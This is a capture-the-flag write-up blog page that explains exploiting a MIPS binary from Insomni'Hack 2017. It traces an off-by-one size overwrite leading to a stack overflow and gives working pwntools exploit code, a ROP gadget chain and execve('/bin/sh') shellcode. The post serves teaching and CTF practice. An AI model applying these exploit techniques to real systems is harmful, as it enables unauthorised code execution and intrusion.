<!doctype html><html lang=en><head><meta charset=utf-8><meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name=viewport><meta content=BlahCats name=author><meta content="Tales of a binary encoded life..." name=description><meta prefix="og: http://ogp.me/ns#" content=BlahCats property=og:site_name><meta prefix="og: http://ogp.me/ns#" content=blog property=og:type><meta content="Insomni'Hack CTF 2017: bender_safer" prefix="og: http://ogp.me/ns#" property=og:title><meta content="Insomni'Hack CTF 2017: bender_safer - by hugsy" prefix="og: http://ogp.me/ns#" property=og:description><meta prefix="og: http://ogp.me/ns#" content=en_US property=og:locale><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/2017-01-26-insomni-hack-ctf-2017-bender-safe property=og:url><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/img/blog-cover.png property=og:image><meta content=summary_large_image name=twitter:card><meta content=@ctf_blahcat name=twitter:site><meta content=BlahCats name=twitter:title><meta content="Insomni'Hack CTF 2017: bender_safer - by hugsy" name=twitter:description><meta content=https://blahcat.github.io/2017-01-26-insomni-hack-ctf-2017-bender-safe name=twitter:url><meta content=https://blahcat.github.io/img/blog-cover.png name=twitter:image:src><script type=application/ld+json>
    {
      "@context" : "http://schema.org",
      "@type" : "Website",
      "name": " BlahCats",
      "url" : "https://blahcat.github.io/2017-01-26-insomni-hack-ctf-2017-bender-safe",
      
      "image": https://blahcat.github.io/img/blog-cover.png",
      
      
      "description": Insomni&#x27;Hack CTF 2017: bender_safer - by hugsy",
      
    }
    </script><title>
  Insomni'Hack CTF 2017: bender_safer
</title><link href=https://blahcat.github.io/img/favicon.ico rel=icon type=image/x-icon><link href=https://blahcat.github.io/css/bootstrap.min.css rel=stylesheet><link href=" https://blahcat.github.io/css/all.min.css" rel=" stylesheet"><link href="https://fonts.googleapis.com/css?family=Roboto" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Montserrat:400,300" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lato" -- <!-- custom for rel=stylesheet styles template this><link href=https://blahcat.github.io/css/clean-blog.css rel=stylesheet><link href=https://blahcat.github.io/css/overrides.css rel=stylesheet><link integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css referrerpolicy=no-referrer rel=stylesheet><body><nav class="navbar navbar-expand-lg navbar-light fixed-top" id=mainNav><div class=container><a class=navbar-brand href=https://blahcat.github.io>BlahCats Blog</a><button aria-label="Toggle navigation" class="navbar-toggler navbar-toggler-right" aria-controls=navbarResponsive aria-expanded=false data-target=#navbarResponsive data-toggle=collapse type=button>Menu <i class="fas fa-bars"></i></button><div class="collapse navbar-collapse" id=navbarResponsive><ul class="navbar-nav ml-auto"><li class=nav-item><a class=nav-link href=https://blahcat.github.io>Home</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/series>Series</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/notes>Notes</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/about>About</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/qemu>Qemu VMs</a></ul></div></div></nav><header class=masthead style=background-image:url(https://blahcat.github.io/img/blog-cover.png)><div class=overlay></div><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><div class=post-heading><h1>Insomni'Hack CTF 2017: bender_safer</h1><span class=meta> <b> ‚Ä¢ <a href=/author/hugsy>hugsy</a> ‚Ä¢ </b> 26 January 2017 <br> <br> <i>Reading time: 9 min</i> </span></div></div></div></div></header><article><article class=post><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><p><a rel="noopener nofollow noreferrer" href=https://web.archive.org/web/20170102081524/https://teaser.insomnihack.ch/ target=_blank>Insomni‚ÄôHack CTF 2017</a> offered a series of 3 challenges (i.e. 3 different flags) on the same binary, called <code>bender_safe</code>:<ul><li><code>bender_safe</code> was a Reversing challenge (50 pts) to <a rel="noopener nofollow noreferrer" href=https://web.archive.org/web/20210518073631/https://advancedpersistentjest.com/2017/01/23/writeup-bender_safe-insomnihack-2017-teaser/ target=_blank>discover the correct validation sequence</a>;<li><code>bender_safer</code> (this one) was a Pwnable challenge (300 pts), which could only be done once the first challenge was solved;<li><code>bender_safest</code> was a Shellcoding challenge (150 pts), which could only be reached done when the two challenges above were solved. The goal was to write a MIPS shellcode to establish a connection to the local port tcp/31337.</ul><p>Close to the end, only 19 teams (out of 400+) had solved this challenge. I finished this challenge after the CTF, and since there was no write-up available, I chose to write one.<h3 id=info>Info</h3><p>The vulnerable file <code>bender_safe</code> is a 32-bit MIPS (Big-Endian) binary.<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>gef‚û§</span><span>  !file ./bender_safe
</span><span style=color:#bf616a>./bender_safe:</span><span> ELF 32-bit MSB executable, MIPS, MIPS-II version 1 (SYSV)</span><span style=color:#bf616a>,</span><span> statically linked, for GNU/Linux 2.6.32, BuildID</span><span style=color:#b48ead>[</span><span>sha1</span><span style=color:#b48ead>]</span><span>=76438e9ed749bcfc6e191e548da153d0d3b3ee28, not stripped
</span><span style=color:#bf616a>gef‚û§</span><span>  checksec
</span><span style=color:#bf616a>[+]</span><span> checksec for '</span><span style=color:#a3be8c>/home/user/bender_safer/bender_safe</span><span>'
</span><span style=color:#bf616a>Canary</span><span>                        : No
</span><span style=color:#bf616a>NX</span><span> Support                    : No
</span><span style=color:#bf616a>PIE</span><span> Support                   : No
</span><span style=color:#bf616a>No</span><span> RPATH                      : Yes
</span><span style=color:#bf616a>No</span><span> RUNPATH                    : Yes
</span><span style=color:#bf616a>Partial</span><span> RelRO                 : No
</span><span style=color:#bf616a>Full</span><span> RelRO                    : No
</span></code></pre><p>No major protection, but I assumed ASLR active and therefore randomizing the stack (only the stack, as the binary is not PIE).<p>In addition, some regions were RWX:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>gef‚û§</span><span>  vmmap
</span><span style=color:#bf616a>Start</span><span>      End        Offset     Perm Path
</span><span style=color:#bf616a>0x00400000</span><span> 0x00494000 0x00000000 r-x /home/user/bender_safer/bender_safe
</span><span style=color:#bf616a>0x004a3000</span><span> 0x004a8000 0x00093000 rw- /home/user/bender_safer/bender_safe
</span><span style=color:#bf616a>0x004a8000</span><span> 0x004cb000 0x00000000 rwx </span><span style=color:#b48ead>[</span><span>heap</span><span style=color:#b48ead>]
</span><span style=color:#bf616a>0x7ffd6000</span><span> 0x7fff7000 0x00000000 rwx </span><span style=color:#b48ead>[</span><span>stack</span><span style=color:#b48ead>]
</span><span style=color:#bf616a>0x7fff7000</span><span> 0x7fff8000 0x00000000 r-x </span><span style=color:#b48ead>[</span><span>vdso</span><span style=color:#b48ead>]
</span></code></pre><h3 id=vulnerability>Vulnerability</h3><p>The binary execution starts where the challenge <code>bender_safe</code> left off, with the OTP validation. We then get into a simple menu offering 3 choices:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>This is Bender's password vault storage
</span><span>I have 54043195528445952 bytes of memory for storage!
</span><span>Although 54043195528444928 of which is used to store my fembots videos...HiHiHi!
</span><span>Your passwords are safe with me meatbag!
</span><span>|                             |
</span><span>|  1. View passwords          |
</span><span>|  2. Enter new passwords     |
</span><span>|  3. View admin password     |
</span><span>|  4. Exit                    |
</span><span>|                             |
</span></code></pre><p>which we can immediately spot in IDA with the function <code>enter_vault</code>. IDA also gives us a clear indication of the stack layout:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>.text:004017E4</span><span> nb_password=</span><span style=color:#bf616a> -0x414
</span><span style=color:#bf616a>.text:004017E4</span><span> passwords=</span><span style=color:#bf616a> -0x410
</span><span style=color:#bf616a>.text:004017E4</span><span> choice=</span><span style=color:#bf616a> -0xC
</span><span style=color:#bf616a>.text:004017E4</span><span> sfp=</span><span style=color:#bf616a> -8
</span><span style=color:#bf616a>.text:004017E4</span><span> retaddr=</span><span style=color:#bf616a> -4
</span></code></pre><p>The <code>passwords</code> variable is a 1028 (0x410-0xC) byte array, which is used to store the passwords. When trying to populate the array (choice #2), the function <code>init_passwords</code> will be hit, and prompt the user for the number of passwords to store, which must be an integer strictly below 513. <code>enter_vault</code> will store the number of passwords to store in 2 locations, a dedicated variable (@ebp-0x414), but also as the first value of the array <code>passwords</code> (i.e. <code>passwords[0]</code>, @ebp-0x410). The number of passwords is used as a counter for a loop that will read the passwords from stdin, thanks to the <code>read_passwords</code> function.</p><a href=https://i.imgur.com/7UfE0bU.png target=_blank> <img alt=image_alt src=https://i.imgur.com/7UfE0bU.png title=image_alt width=100%> </a><p>After spending way too long spent trying to check for an arithmetic mistake, I reviewed more thoroughly the function <code>read_passwords</code>.<p>The function <code>read_passwords</code> takes two arguments, a pointer to a buffer and a integer, which corresponds to the size of data to read. The buffer is populated one character at a time, in the following loop:</p><a href=https://i.imgur.com/OYLowAm.png target=_blank> <img alt=image_alt src=https://i.imgur.com/OYLowAm.png title=image_alt width=100%> </a><p>The interesting bit starts around 0x401640: when a <code>\n</code> character is provided to fill the byte at offset <code>i</code> (i.e. <code>buffer[i]</code>), the function performs an additional check to test if the preceding character (i.e. <code>buffer[i-1]</code>) was <code>\r</code> and if so replace it with <code>\n</code>. And the vulnerability (as subtle as it is) is here: when overwriting the byte, the function does not check that <code>i>0</code>. Because we are on big endian architecture, this can lead to size overwrite. To do so, we need to<ul><li>Specify a number of passwords of <code>ord('\r')</code> (or 13);<li>The application will reply that we can store 13 passwords of 76 bytes;<li>Enter a first password with only <code>\n</code></ul><p>This will overwrite the number of passwords stored in <code>passwords[0]</code> to 10, allowing us to write 12 passwords of 102 bytes (i.e. 1224 bytes), which results in a stack overflow.<p>The vulnerability can be asserted by setting a breakpoint before and after the first call to <code>read_passwords</code>.<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>gef‚û§</span><span>  b *0x004019BC
</span><span style=color:#bf616a>Breakpoint</span><span> 1 at 0x4019bc
</span><span style=color:#bf616a>gef‚û§</span><span>  r
</span><span style=color:#bf616a>[...]
</span><span>|                             |
</span><span>|  </span><span style=color:#bf616a>1.</span><span> View passwords          |
</span><span>|  </span><span style=color:#bf616a>2.</span><span> Enter new passwords     |
</span><span>|  </span><span style=color:#bf616a>3.</span><span> View admin password     |
</span><span>|  </span><span style=color:#bf616a>4.</span><span> Exit                    |
</span><span>|                             |
</span><span style=color:#bf616a>2
</span><span style=color:#bf616a>How</span><span> many passwords do you want to store? : 13
</span><span style=color:#bf616a>You</span><span> can store 13 passwords of 76 length, enjoy!
</span><span style=color:#bf616a>Enter</span><span> your passwords, one per line
</span><span>
</span><span style=color:#bf616a>Breakpoint</span><span> 1, 0x004019bc in enter_vault ()
</span><span style=color:#bf616a>gef‚û§</span><span>  p/x $</span><span style=color:#bf616a>a0</span><span>-4
</span><span style=color:#bf616a>0x7fff62d8
</span><span style=color:#bf616a>gef‚û§</span><span>  x/x 0x7fff62d8
</span><span style=color:#bf616a>0x7fff62d8:</span><span>     0x0000000d   </span><span style=color:#65737e># << current size, before the call to read_passwords(
</span><span style=color:#bf616a>gef‚û§</span><span>  advance *0x004019c4
</span><span>                             </span><span style=color:#65737e># << enter an empty first password (only \n)
</span><span style=color:#bf616a>gef‚û§</span><span>  x/x 0x7fff62d8
</span><span style=color:#bf616a>0x7fff62d8:</span><span>     0x0000000a   </span><span style=color:#65737e># << new size, after the call
</span></code></pre><p>And if we populate the 12 remaining passwords with ‚ÄúA‚Äù*102 the return address (<code>$ra</code> register) gets corrupted, which we can observe by taking the exit:</p><a href=https://i.imgur.com/INggKTu.png target=_blank> <img alt=image_alt src=https://i.imgur.com/INggKTu.png title=image_alt width=100%> </a><h3 id=exploitation>Exploitation</h3><h4 id=controlling-pc>Controlling $pc</h4><p>So we are now able to make the program crash. To know the exact offset of <code>$pc</code>, I‚Äôve used the De Bruijn pattern from <code>gef</code> and <code>pwntools</code>.<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>if </span><span>__name__ == "</span><span style=color:#a3be8c>__main__</span><span>":
</span><span>    </span><span style=color:#bf616a>HOST</span><span>, </span><span style=color:#bf616a>PORT </span><span>= "</span><span style=color:#a3be8c>localhost</span><span>", </span><span style=color:#d08770>12234
</span><span>    r = </span><span style=color:#bf616a>remote</span><span>(</span><span style=color:#bf616a>HOST</span><span>, </span><span style=color:#bf616a>PORT</span><span>)
</span><span>    r.</span><span style=color:#bf616a>recvuntil</span><span>("</span><span style=color:#a3be8c>Here's your OTP challenge : </span><span style=color:#96b5b4>\n</span><span>")
</span><span>    chal = r.</span><span style=color:#bf616a>readline</span><span>().</span><span style=color:#bf616a>strip</span><span>()
</span><span>    resp = </span><span style=color:#bf616a>validate</span><span>(chal)
</span><span>    r.</span><span style=color:#bf616a>sendline</span><span>(resp)
</span><span>
</span><span>    log.</span><span style=color:#bf616a>info</span><span>("</span><span style=color:#a3be8c>poisoing buf[-1] with </span><span style=color:#96b5b4>\\</span><span style=color:#a3be8c>r</span><span>")
</span><span>    r.</span><span style=color:#bf616a>sendline</span><span>("</span><span style=color:#a3be8c>2</span><span>")
</span><span>    r.</span><span style=color:#bf616a>recvuntil</span><span>('</span><span style=color:#a3be8c>How many passwords do you want to store? : </span><span>')
</span><span>    l = </span><span style=color:#d08770>13 </span><span style=color:#65737e># \r
</span><span>    r.</span><span style=color:#bf616a>sendline</span><span>(</span><span style=color:#bf616a>str</span><span>(l))
</span><span>    r.</span><span style=color:#bf616a>recvline</span><span>()
</span><span>    r.</span><span style=color:#bf616a>recvline</span><span>()
</span><span>    r.</span><span style=color:#bf616a>send</span><span>('</span><span style=color:#96b5b4>\n</span><span>') </span><span style=color:#65737e># this will force passwords[0] to be overwritten with 0xA, making the password size length wrong
</span><span>
</span><span>    log.</span><span style=color:#bf616a>info</span><span>("</span><span style=color:#a3be8c>filling up the stack</span><span>")
</span><span>    </span><span style=color:#96b5b4>raw_input</span><span>("</span><span style=color:#a3be8c>attach to gdb now...</span><span>")
</span><span>    pattern = </span><span style=color:#bf616a>cyclic</span><span>(</span><span style=color:#d08770>2000</span><span>, </span><span style=color:#bf616a>n</span><span>=</span><span style=color:#d08770>4</span><span>)
</span><span>    </span><span style=color:#b48ead>for </span><span>i </span><span style=color:#b48ead>in </span><span style=color:#96b5b4>range</span><span>(</span><span style=color:#d08770>12</span><span>):
</span><span>        r.</span><span style=color:#bf616a>send</span><span>(pattern[i*</span><span style=color:#d08770>102</span><span>:i*</span><span style=color:#d08770>102</span><span>+</span><span style=color:#d08770>102</span><span>])
</span><span>
</span><span>    r.</span><span style=color:#bf616a>interactive</span><span>()
</span></code></pre><p>And we now know that the PC is controlled at offset 921, as we are on a Big Endian architecture:</p><a href=https://i.imgur.com/NYLt8XQ.png target=_blank> <img alt=image_alt src=https://i.imgur.com/NYLt8XQ.png title=image_alt width=100%> </a><h4 id=rop-ing-to-a-fixed-area>ROP-ing to a fixed area</h4><p>So great, we can control <code>$ra</code>, and therefore call any location. But the MIPS ABI uses registers (from <code>$a0</code> to <code>$a3</code>) to store parameters of function calls so we need to control (at least some of) them.<p>To achieve code execution, I decided to reach control only of <code>$a0</code> and <code>$a1</code>, which is then sufficient to call <code>read_passwords(buffer, length)</code>, and have a shellcode copied into one of the fixed RWX location.<p>After seeing too many ROP tools for MIPS fail, I simply used <code>objdump -D</code> to find the following gadgets:<ul><li>0x00403ba4: Control <code>$s2</code> from a value given from the stack</ul><pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>.text:00403BA4</span><span> lw      $</span><span style=color:#bf616a>ra</span><span>, 0x28+var_4($</span><span style=color:#bf616a>sp</span><span>)
</span><span style=color:#bf616a>.text:00403BA8</span><span> lw      $</span><span style=color:#bf616a>s2</span><span>, 0x28+var_8($</span><span style=color:#bf616a>sp</span><span>)
</span><span style=color:#bf616a>.text:00403BAC</span><span> lw      $</span><span style=color:#bf616a>s1</span><span>, 0x28+var_C($</span><span style=color:#bf616a>sp</span><span>)
</span><span style=color:#bf616a>.text:00403BB0</span><span> lw      $</span><span style=color:#bf616a>s0</span><span>, 0x28+var_10($</span><span style=color:#bf616a>sp</span><span>)
</span><span style=color:#bf616a>.text:00403BB4</span><span> jr      $</span><span style=color:#bf616a>ra
</span></code></pre><ul><li>0x403bbc: Use <code>$s2</code> to control <code>$v0</code></ul><pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>.text:00403BBC</span><span> lw      $</span><span style=color:#bf616a>ra</span><span>, 0x28+var_4($</span><span style=color:#bf616a>sp</span><span>)
</span><span style=color:#bf616a>.text:00403BC0</span><span> move    $</span><span style=color:#bf616a>v0</span><span>, $</span><span style=color:#bf616a>s2
</span><span style=color:#bf616a>.text:00403BC4</span><span> lw      $</span><span style=color:#bf616a>s1</span><span>, 0x28+var_C($</span><span style=color:#bf616a>sp</span><span>)
</span><span style=color:#bf616a>.text:00403BC8</span><span> lw      $</span><span style=color:#bf616a>s2</span><span>, 0x28+var_8($</span><span style=color:#bf616a>sp</span><span>)
</span><span style=color:#bf616a>.text:00403BCC</span><span> lw      $</span><span style=color:#bf616a>s0</span><span>, 0x28+var_10($</span><span style=color:#bf616a>sp</span><span>)
</span><span style=color:#bf616a>.text:00403BD0</span><span> jr      $</span><span style=color:#bf616a>ra
</span></code></pre><ul><li>0x00403b98: Use <code>$v0</code> to control <code>$a0</code></ul><pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>.text:00403B98</span><span> move    $</span><span style=color:#bf616a>a0</span><span>, $</span><span style=color:#bf616a>v0
</span><span style=color:#bf616a>.text:00403B9C</span><span> bnez    $</span><span style=color:#bf616a>s0</span><span>, loc_403B7C
</span><span style=color:#bf616a>.text:00403BA0</span><span> move    $</span><span style=color:#bf616a>a1</span><span>, $</span><span style=color:#bf616a>zero
</span></code></pre><ul><li>By re-using gadget@0x00403ba4 with 0x004038e8, we use <code>$s2</code> to control <code>$a1</code></ul><pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>.text:004038E8</span><span> move    $</span><span style=color:#bf616a>a1</span><span>, $</span><span style=color:#bf616a>s2
</span><span style=color:#bf616a>.text:004038EC</span><span> lw      $</span><span style=color:#bf616a>ra</span><span>, 0x30+var_4($</span><span style=color:#bf616a>sp</span><span>)
</span><span style=color:#bf616a>.text:004038F0</span><span> lw      $</span><span style=color:#bf616a>s4</span><span>, 0x30+var_8($</span><span style=color:#bf616a>sp</span><span>)
</span><span style=color:#bf616a>.text:004038F4</span><span> lw      $</span><span style=color:#bf616a>s3</span><span>, 0x30+var_C($</span><span style=color:#bf616a>sp</span><span>)
</span><span style=color:#bf616a>.text:004038F8</span><span> lw      $</span><span style=color:#bf616a>s2</span><span>, 0x30+var_10($</span><span style=color:#bf616a>sp</span><span>)
</span><span style=color:#bf616a>.text:004038FC</span><span> lw      $</span><span style=color:#bf616a>s1</span><span>, 0x30+var_14($</span><span style=color:#bf616a>sp</span><span>)
</span><span style=color:#bf616a>.text:00403900</span><span> lw      $</span><span style=color:#bf616a>s0</span><span>, 0x30+var_18($</span><span style=color:#bf616a>sp</span><span>)
</span><span style=color:#bf616a>.text:00403904</span><span> sltiu   $</span><span style=color:#bf616a>v0</span><span>, 1
</span><span style=color:#bf616a>.text:00403908</span><span> jr      $</span><span style=color:#bf616a>ra
</span></code></pre><p>We can chain those 4 gadgets to entirely control <code>$a0</code> and <code>$a1</code> and then call <code>read_passwords</code> to write a <code>execve('/bin/sh')</code> shellcode into one of fixed RWX pages (I‚Äôve chosen 0x004a8a00).<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>log.</span><span style=color:#bf616a>info</span><span>("</span><span style=color:#a3be8c>preparing ropchain</span><span>")
</span><span>sfp = </span><span style=color:#bf616a>p32</span><span>(</span><span style=color:#d08770>0x004a8000</span><span>)
</span><span>set_s2 = </span><span style=color:#bf616a>p32</span><span>(</span><span style=color:#d08770>0x403BA4</span><span>)
</span><span>set_v0 = </span><span style=color:#bf616a>p32</span><span>(</span><span style=color:#d08770>0x403BBC</span><span>)
</span><span>set_a0 = </span><span style=color:#bf616a>p32</span><span>(</span><span style=color:#d08770>0x403B98</span><span>)
</span><span>set_a1 = </span><span style=color:#bf616a>p32</span><span>(</span><span style=color:#d08770>0x4038e8</span><span>)
</span><span>read_passwords = </span><span style=color:#bf616a>p32</span><span>(</span><span style=color:#d08770>0x004015E8</span><span>)
</span><span>a0 = </span><span style=color:#bf616a>p32</span><span>(</span><span style=color:#d08770>0x004a8a00</span><span>)
</span><span>a1 = </span><span style=color:#bf616a>p32</span><span>(</span><span style=color:#d08770>0x100</span><span>)
</span><span>p = '</span><span style=color:#a3be8c>YOLO</span><span>'*</span><span style=color:#d08770>2 </span><span>+ sfp
</span><span>p+= set_s2 + '</span><span style=color:#a3be8c>YOLO</span><span>'*</span><span style=color:#d08770>8 </span><span>+ a0 + set_v0 + </span><span style=color:#bf616a>p32</span><span>(</span><span style=color:#d08770>0</span><span>)*</span><span style=color:#d08770>9 </span><span>+ set_a0 + "</span><span style=color:#a3be8c>YOLO</span><span>"*</span><span style=color:#d08770>8 </span><span>+ '</span><span style=color:#a3be8c>ZZZ</span><span>'
</span><span>p+= set_s2 + '</span><span style=color:#a3be8c>YOLO</span><span>'*</span><span style=color:#d08770>8 </span><span>+ a1 + set_a1 + '</span><span style=color:#a3be8c>YOLO</span><span>'*</span><span style=color:#d08770>10 </span><span>+ '</span><span style=color:#a3be8c>Z</span><span>'*</span><span style=color:#d08770>3
</span><span>p+= read_passwords + "</span><span style=color:#a3be8c>YOLO</span><span>"*</span><span style=color:#d08770>9 </span><span>+ </span><span style=color:#bf616a>p32</span><span>(</span><span style=color:#d08770>0x4a8a00</span><span>)
</span><span>payload = p.</span><span style=color:#bf616a>ljust</span><span>(</span><span style=color:#d08770>303</span><span>, "</span><span style=color:#a3be8c>Z</span><span>")
</span><span>r.</span><span style=color:#bf616a>send</span><span>(payload[:</span><span style=color:#d08770>102</span><span>])
</span><span>r.</span><span style=color:#bf616a>send</span><span>(payload[</span><span style=color:#d08770>102</span><span>:</span><span style=color:#d08770>204</span><span>])
</span><span>r.</span><span style=color:#bf616a>send</span><span>(payload[</span><span style=color:#d08770>204</span><span>:])
</span></code></pre><h4 id=shellcode-crafting>Shellcode crafting</h4><p>For some reasons, the different shellcodes I had from external resources did not work. So I decided to use <a rel="noopener nofollow noreferrer" href=http://www.keystone-engine.org target=_blank>Keystone Engine</a> to write one. Instead of writing totally from scratch, I used a template created earlier as part of my project <a rel="noopener nofollow noreferrer" href=https://github.com/hugsy/cemu/blob/main/cemu/examples/mipsbe_sys_exec_bin_sh.asm target=_blank><code>cemu</code></a> and adapted it:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>log.</span><span style=color:#bf616a>info</span><span>("</span><span style=color:#a3be8c>preparing shellcode</span><span>")
</span><span>shellcode = [
</span><span>  "</span><span style=color:#a3be8c>li $sp, 0x4a8b00</span><span>",
</span><span>  "</span><span style=color:#a3be8c>li $v0, 0x2f62696e</span><span>",
</span><span>  "</span><span style=color:#a3be8c>sw $v0, 0($sp)</span><span>",
</span><span>  "</span><span style=color:#a3be8c>li $v0, 0x2f736800</span><span>",
</span><span>  "</span><span style=color:#a3be8c>sw $v0, 4($sp)</span><span>",
</span><span>  "</span><span style=color:#a3be8c>li $v0, 4011</span><span>",
</span><span>  "</span><span style=color:#a3be8c>move $a0, $sp</span><span>",
</span><span>  "</span><span style=color:#a3be8c>addiu $a1, $zero, 0</span><span>",
</span><span>  "</span><span style=color:#a3be8c>addiu $a2, $zero, 0</span><span>",
</span><span>  "</span><span style=color:#a3be8c>syscall</span><span>",
</span><span>]
</span><span>
</span><span>arch, mode, endian = keystone.</span><span style=color:#bf616a>KS_ARCH_MIPS</span><span>, keystone.</span><span style=color:#bf616a>KS_MODE_MIPS32</span><span>, keystone.</span><span style=color:#bf616a>KS_MODE_BIG_ENDIAN
</span><span>ks = keystone.</span><span style=color:#bf616a>Ks</span><span>(arch, mode | endian)
</span><span>sc, cnt = ks.</span><span style=color:#bf616a>asm</span><span>(shellcode)
</span><span>log.</span><span style=color:#bf616a>info</span><span>("</span><span style=color:#a3be8c>keystone compiled </span><span style=color:#d08770>%d</span><span style=color:#a3be8c> instructions</span><span>" % cnt)
</span><span>sc = "".</span><span style=color:#bf616a>join</span><span>([</span><span style=color:#96b5b4>chr</span><span>(x) </span><span style=color:#b48ead>for </span><span>x </span><span style=color:#b48ead>in </span><span>sc])
</span><span>r.</span><span style=color:#bf616a>send</span><span>(sc)
</span></code></pre><blockquote><p><strong>Update</strong>: as <a class="fab fa-twitter" href="https://twitter.com/0xGrimmlin](https://twitter.com/0xGrimmlin) [mentioned" target=_blank> <code>@0xGrimmlin](https://twitter.com/0xGrimmlin) [mentioned</code> </a> , during the CTF, the challenge was actually QEMU chroot-ed, so technically this shellcode would not have worked, but you could similarly build another one doing open/read/write(stdout)</blockquote><h4 id=fire>Fire</h4><p>We have now all the components to launch our exploit. The final version is available <a rel="noopener nofollow noreferrer" href=https://gist.github.com/hugsy/3e64b7cae4de38ba153a23e5491bff24 target=_blank>here</a>.</p><a href=https://i.imgur.com/VJgWcia.png target=_blank> <img alt=image_alt22 src=https://i.imgur.com/VJgWcia.png title=image_alt22 width=100%> </a><h3 id=conclusion>Conclusion</h3><p>This is it‚Ä¶ Well not really. The ultimate challenge was to craft a shellcode to connect to tcp/31337. But the way we used to solve this challenge in the last sections of this blog post makes it trivial to extend (by simply establishing a TCP connection) and solve the final challenge. I will leave this to the reader‚Äôs curiosity ‚ò∫<p>I will just conclude this post by thanking the <a rel="noopener nofollow noreferrer" href=https://insomnihack.ch target=_blank>Insomni‚Äôhack</a> team for putting up together such fun and original challenges. And also, huge congratulations ü•Ç to the few teams who scored this challenge during the CTF.<p>Hope you enjoyed this article, and see you next time for more challenges‚Ä¶<aside class=post-tags><p>Categories: <a href=https://blahcat.github.io/categories/ctf/>#ctf</a><p>Tags: <a href=https://blahcat.github.io/tags/pwn/>#pwn</a> <a href=https://blahcat.github.io/tags/linux/>#linux</a> <a href=https://blahcat.github.io/tags/insomnihack/>#insomnihack</a> <a href=https://blahcat.github.io/tags/mips/>#mips</a> <a href=https://blahcat.github.io/tags/stack-overflow/>#stack-overflow</a> <a href=https://blahcat.github.io/tags/rop/>#rop</a> <a href=https://blahcat.github.io/tags/shellcode/>#shellcode</a> <a href=https://blahcat.github.io/tags/keystone/>#keystone</a></aside><aside class=post-discussion>Join the Discussion on <a href="https://github.com/blahcat/blahcat.github.io/discussions?discussions_q=Insomni'Hack CTF 2017: bender_safer" target=_blank> <i class="fab fa-github fa-lg"></i>¬†GitHub </a></aside><aside class=post-nav><div class=container><div class=row><div class=col><b>Next:</b><br><a class=post-nav-prev href=https://blahcat.github.io/2017-06-25-qemu-images-to-play-with/> <section class=post-nav-teaser><b class=post-nav-title>Some Qemu images to play with</b><p class=post-nav-excerpt>TL;DR Ready-to-play Qemu images for under-rated architectures (ARM, MIPS, ‚Ä¶</section> </a></div><div class=col><b>Previous:</b><br><a class=post-nav-next href=https://blahcat.github.io/2017-01-24-armpwn-redux-canary-reloaded/> <section class=post-nav-teaser><b class=post-nav-title>ARMPWN redux: canary reloaded</b><p class=post-nav-excerpt>TL;DR: It is possible to defeat stack canary protection when a binary is v‚Ä¶</section> </a></div></div></div></aside></div></div><hr><footer><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><ul class="list-inline text-center"><li class=list-inline-item><a href=https://blahcat.github.io/atom.xml> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fas fa-rss fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://twitter.com/ctf_blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-twitter fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://github.com/blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-github fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://www.youtube.com/channel/UCDrgY65mRZWVoMiB5-VMqfg> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-youtube fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://discord.gg/hSbqxxBgRX> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-discord fa-stack-1x fa-inverse"></i> </span> </a></ul><p class="copyright text-muted">Made with ‚ù§ with Zola</div></div></div></footer><script src=https://blahcat.github.io/js/jquery.min.js></script><script src=https://blahcat.github.io/js/bootstrap.bundle.min.js></script><script 